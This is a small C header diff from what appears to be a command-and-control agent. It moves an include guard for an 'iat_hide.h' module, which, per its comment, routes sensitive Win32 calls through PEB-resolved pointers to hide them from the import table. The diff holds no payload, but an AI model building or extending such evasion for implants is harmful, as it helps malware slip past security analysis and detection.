@@ -455,9 +455,8 @@ BOOL send_task_result(AgentState *state, const unsigned char *task_id,
 
 /* ─── IAT hiding: redirect sensitive Win32 calls through PEB-resolved pointers ───
  * Must come LAST — after all windows.h declarations are visible.
- * iat_hide.c defines IAT_HIDE_IMPL to suppress the macros in its own TU. */
-#ifndef IAT_HIDE_IMPL
+ * iat_hide.h itself guards the redirect macros behind #ifndef IAT_HIDE_IMPL,
+ * so iat_hide.c (which defines IAT_HIDE_IMPL) gets typedefs+externs but not macros. */
 #include "iat_hide.h"
-#endif
 
 #endif /* AGENT_H */
